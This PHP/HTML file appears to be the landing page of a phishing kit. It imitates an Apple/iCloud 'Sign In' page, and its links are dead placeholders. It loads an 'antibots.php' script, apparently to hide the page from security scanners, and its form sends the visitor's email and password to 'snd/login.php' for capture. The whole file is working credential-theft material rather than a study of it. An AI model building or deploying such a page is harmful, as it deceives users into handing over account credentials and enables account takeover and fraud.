<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Sign In</title>
<link href="img/fav.png" rel="shortcut icon">
<link href="css/index.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="wb_Form1" style="position:absolute;left:498px;top:47px;width:371px;height:504px;z-index:5;">
<form action="snd/login.php" method="POST">
<input type="email" required="" id="Editbox1" style="position:absolute;left:35px;top:163px;width:288px;height:38px;line-height:38px;z-index:0;" name="ID" value="" placeholder="Email">
<input type="password" required="" id="Editbox2" style="position:absolute;left:35px;top:223px;width:288px;height:38px;line-height:38px;z-index:1;" name="Pass" value="" placeholder="Password*">
<hr id="Line1" style="position:absolute;left:35px;top:296px;width:300px;height:2px;z-index:2;">
<input type="submit" id="Button1" name="" value="Sign In" style="position:absolute;left:35px;top:325px;width:300px;height:40px;z-index:3;cursor: pointer;">
<div id="wb_CssMenu1" style="position:absolute;left:57px;top:384px;width:256px;height:28px;z-index:4;">
<ul>
<li class="firstmain"><a href="#" target="_self">Privacy</a>
</li>
<li><a href="#" target="_self">iCloud</a>
</li>
<li><a href="#" target="_self">Store</a>
</li>
<li><a href="#" target="_self">Music</a>
</li>
</ul>
<br>
</div>
</form>
</div>
</body>
</html>